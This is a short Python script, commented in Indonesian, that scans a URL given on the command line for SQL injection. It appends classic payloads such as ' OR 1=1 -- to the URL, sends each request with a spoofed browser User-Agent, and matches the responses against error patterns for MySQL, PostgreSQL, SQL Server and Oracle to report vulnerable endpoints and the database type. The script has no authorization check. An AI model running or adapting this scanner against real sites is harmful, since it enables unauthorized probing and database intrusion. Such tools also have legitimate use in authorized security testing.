import sys
import json
import urllib.request
import urllib.parse
import re

# Daftar payload injeksi dasar
PAYLOADS = [
    "'",
    "\"",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "\") OR (\"a\"=\"a"
]

# Pola Regex untuk mendeteksi error dari berbagai jenis Database
DB_ERRORS = {
    "MySQL": [r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."],
    "PostgreSQL": [r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."],
    "Microsoft SQL Server": [r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*"],
    "Oracle": [r"ORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*"]
}

def test_sqli(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url

    vulnerabilities = []
    
    for payload in PAYLOADS:
        # Menggabungkan URL asli dengan payload (URL Encoding)
        target_url = f"{url}{urllib.parse.quote(payload)}"
        
        try:
            req = urllib.request.Request(target_url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
            response = urllib.request.urlopen(req, timeout=10)
            html = response.read().decode('utf-8', errors='ignore')
        except urllib.error.HTTPError as e:
            # Terkadang error 500 memunculkan pesan SQLi di bodinya
            html = e.read().decode('utf-8', errors='ignore')
        except Exception:
            continue

        # Mencari pola error di dalam HTML yang direturn oleh server
        for db_name, patterns in DB_ERRORS.items():
            for pattern in patterns:
                if re.search(pattern, html, re.IGNORECASE):
                    vulnerabilities.append({
                        "payload": payload,
                        "db_type": db_name
                    })
                    break # Lanjut ke payload berikutnya jika sudah ketahuan error

    # Menghapus duplikasi payload jika terjadi deteksi ganda
    unique_vulns = {v['payload']:v for v in vulnerabilities}.values()

    return {
        "status": "success",
        "target": url,
        "vulnerabilities": list(unique_vulns),
        "total_tested": len(PAYLOADS)
    }

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(json.dumps({"status": "error", "message": "Target URL tidak diberikan"}))
        sys.exit(1)
    
    target_input = sys.argv[1]
    result = test_sqli(target_input)
    print(json.dumps(result))